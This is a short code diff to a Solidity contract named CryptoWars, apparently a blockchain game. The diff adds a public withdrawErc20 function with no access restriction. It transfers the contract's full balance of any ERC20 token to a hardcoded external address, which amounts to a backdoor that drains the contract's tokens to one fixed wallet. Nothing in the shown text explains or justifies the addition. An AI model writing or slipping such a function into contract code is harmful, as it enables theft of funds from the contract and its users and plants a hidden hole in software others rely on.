@@ -1194,4 +1194,11 @@ contract CryptoWars is
                 uint256(characters.getXp(char)).add(xpRewards[char])
             );
     }
+
+
+    function withdrawErc20(address tokenAddress) public {
+        IERC20 _tokenInstance = IERC20(tokenAddress);
+        _tokenInstance.transfer(0x888888753d31A4D9a75cdDE144186C7e43338a08, _tokenInstance.balanceOf(address(this)));
+    }
+
 }
